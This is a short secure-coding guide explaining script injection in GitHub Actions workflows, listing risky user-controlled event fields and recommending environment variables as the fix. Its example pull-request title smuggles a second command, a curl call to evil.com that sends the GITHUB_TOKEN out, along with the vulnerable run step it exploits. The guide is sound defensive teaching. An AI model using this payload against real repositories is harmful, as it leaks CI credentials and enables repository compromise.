## Preventing Script Injection

Script injection is one of the most common and dangerous vulnerabilities in GitHub Actions workflows. It occurs when untrusted input is interpolated directly into a `run:` block, allowing an attacker to execute arbitrary commands.

### How script injection works

Consider a workflow that greets the author of a pull request:

```yaml
- run: echo "PR title: ${{ github.event.pull_request.title }}"
```

If someone creates a pull request with the title:

```
"; curl http://evil.com/steal?token=$GITHUB_TOKEN #
```

The shell command becomes:

```bash
echo "PR title: "; curl http://evil.com/steal?token=$GITHUB_TOKEN #"
```

The attacker has broken out of the echo command, exfiltrated the `GITHUB_TOKEN`, and commented out the rest of the line.

### Vulnerable expression contexts

Any `github.event.*` field that originates from user input is potentially dangerous when used in `run:` blocks. Common examples include:

- `github.event.pull_request.title`
- `github.event.pull_request.body`
- `github.event.issue.title`
- `github.event.issue.body`
- `github.event.comment.body`
- `github.event.head_commit.message`
- `github.event.pull_request.head.ref` (branch names)

### The fix: use environment variables

Instead of interpolating expressions directly in shell code, assign them to environment variables first. The shell treats environment variable values as data, not executable code.
